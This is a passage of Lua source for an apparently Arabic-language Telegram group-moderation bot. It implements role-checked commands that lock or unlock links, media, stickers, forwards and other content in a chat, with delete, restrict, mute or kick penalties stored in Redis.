if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."lock:emoje"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم فتح السمايلات")  
elseif text ==  "فتح الدردشه" then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end 
redis:del(bot_id.."Tshakex:Lock:text"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الدردشه")  
elseif text ==  "فتح الدخول" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."Tshakex:Lock:Join"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح دخول الاعضاء")  
elseif text ==  "فتح البوتات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح البوتات")  
elseif text ==  "فتح البوتات " then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","\n• تم فتح البوتات")  
elseif text ==  "فتح الاشعارات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end  
redis:del(bot_id.."Tshakex:Lock:tagservr"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الاشعارات")  
elseif text ==  "فتح التثبيت" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:del(bot_id.."Tshakex:lockpin"..msg.chat_id_)  
redis:srem(bot_id.."Tshakex:Lock:pin",msg.chat_id_)
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح التثبيت هنا")  
elseif text ==  "فتح التعديل" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:del(bot_id.."Tshakex:Lock:edit"..msg.chat_id_) 
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح تعديل")  
elseif text ==  "فتح التعديل الميديا" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:del(bot_id.."Tshakex:Lock:edit"..msg.chat_id_) 
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح تعديل")  
elseif text ==  "فتح الكل" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."Tshakex:Lock:tagservrbot"..msg.chat_id_)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do;redis:del(bot_id..lock..msg.chat_id_);end
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح جميع الاوامر")  
elseif text ==  "قفل الروابط" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Link"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الروابط")  
elseif text ==  "قفل الروابط بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Link"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الروابط")  
elseif text ==  "قفل الروابط بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Link"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الروابط")  
elseif text ==  "قفل الروابط بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Link"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الروابط")  
elseif text ==  "فتح الروابط" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Link"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الروابط")  
elseif text ==  "قفل المعرفات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل المعرفات")  
elseif text ==  "قفل المعرفات بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل المعرفات")  
elseif text ==  "قفل المعرفات بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل المعرفات")  
elseif text ==  "قفل المعرفات بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل المعرفات")  
elseif text ==  "فتح المعرفات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح المعرفات")  
elseif text ==  "قفل التاك" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل التاك")  
elseif text ==  "قفل التاك بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل التاك")  
elseif text ==  "قفل التاك بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل التاك")  
elseif text ==  "قفل التاك بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل التاك")  
elseif text ==  "فتح التاك" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح التاك")  
elseif text ==  "قفل الشارحه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الشارحه")  
elseif text ==  "قفل الشارحه بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الشارحه")  
elseif text ==  "قفل الشارحه بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الشارحه")  
elseif text ==  "قفل الشارحه بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الشارحه")  
elseif text ==  "فتح الشارحه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الشارحه")  
elseif text ==  "قفل الصور"then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الصور")  
elseif text ==  "قفل الصور بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الصور")  
elseif text ==  "قفل الصور بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الصور")  
elseif text ==  "قفل الصور بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الصور")  
elseif text ==  "فتح الصور" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الصور")  
elseif text ==  "قفل الفيديو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Video"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الفيديو")  
elseif text ==  "قفل الفيديو بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Video"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الفيديو")  
elseif text ==  "قفل الفيديو بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Video"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الفيديو")  
elseif text ==  "قفل الفيديو بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Video"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الفيديو")  
elseif text ==  "فتح الفيديو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Video"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الفيديو")  
elseif text ==  "قفل المتحركه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل المتحركه")  
elseif text ==  "قفل المتحركه بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل المتحركه")  
elseif text ==  "قفل المتحركه بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل المتحركه")  
elseif text ==  "قفل المتحركه بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل المتحركه")  
elseif text ==  "فتح المتحركه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح المتحركه")  
elseif text ==  "قفل الالعاب" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:geam"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الالعاب")  
elseif text ==  "قفل الالعاب بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:geam"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الالعاب")  
elseif text ==  "قفل الالعاب بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:geam"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الالعاب")  
elseif text ==  "قفل الالعاب بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:geam"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الالعاب")  
elseif text ==  "فتح الالعاب" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:geam"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الالعاب")  
elseif text ==  "قفل الاغاني" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الاغاني")  
elseif text ==  "قفل الاغاني بالت��ييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الاغاني")  
elseif text ==  "قفل الاغاني بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الاغاني")  
elseif text ==  "قفل الاغاني بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الاغاني")  
elseif text ==  "فتح الاغاني" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الاغاني")  
elseif text ==  "قفل الصوت" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:vico"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الصوت")  
elseif text ==  "قفل الصوت بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:vico"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الصوت")  
elseif text ==  "قفل الصوت بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:vico"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الصوت")  
elseif text ==  "قفل الصوت بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:vico"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الصوت")  
elseif text ==  "فتح الصوت" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:vico"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الصوت")  
elseif text ==  "قفل الكيبورد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الكيبورد")  
elseif text ==  "قفل الكيبورد بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الكيبورد")  
elseif text ==  "قفل الكيبورد بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الكيبورد")  
elseif text ==  "قفل الكيبورد بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الكيبورد")  
elseif text ==  "فتح الكيبورد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الكيبورد")  
elseif text ==  "قفل الملصقات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الملصقات")  
elseif text ==  "قفل الملصقات بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الملصقات")  
elseif text ==  "قفل الملصقات بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الملصقات")  
elseif text ==  "قفل الملصقات بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الملصقات")  
elseif text ==  "فتح الملصقات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الملصقات")  
elseif text ==  "قفل التوجيه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:forward"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل التوجيه")  
elseif text ==  "قفل التوجيه بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:forward"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل التوجيه")  
elseif text ==  "قفل التوجيه بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:forward"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل التوجيه")  
elseif text ==  "قفل التوجيه بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:forward"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل التوجيه")  
elseif text ==  "فتح التوجيه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:forward"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح التوجيه")  
elseif text ==  "قفل الملفات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Document"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الملفات")  
elseif text ==  "قفل الملفات بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Document"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الملفات")  
elseif text ==  "قفل الملفات بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Document"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الملفات")  
elseif text ==  "قفل الملفات بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Document"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الملفات")  
elseif text ==  "فتح الملفات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Document"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الملفات")  
elseif text ==  "قفل السيلفي" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل السيلفي")  
elseif text ==  "قفل السيلفي بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل السيلفي")  
elseif text ==  "قفل السيلفي بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل السيلفي")  
elseif text ==  "قفل السيلفي بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل السيلفي")  
elseif text ==  "فتح السيلفي" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح السيلفي")  
elseif text ==  "قفل الماركداون" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
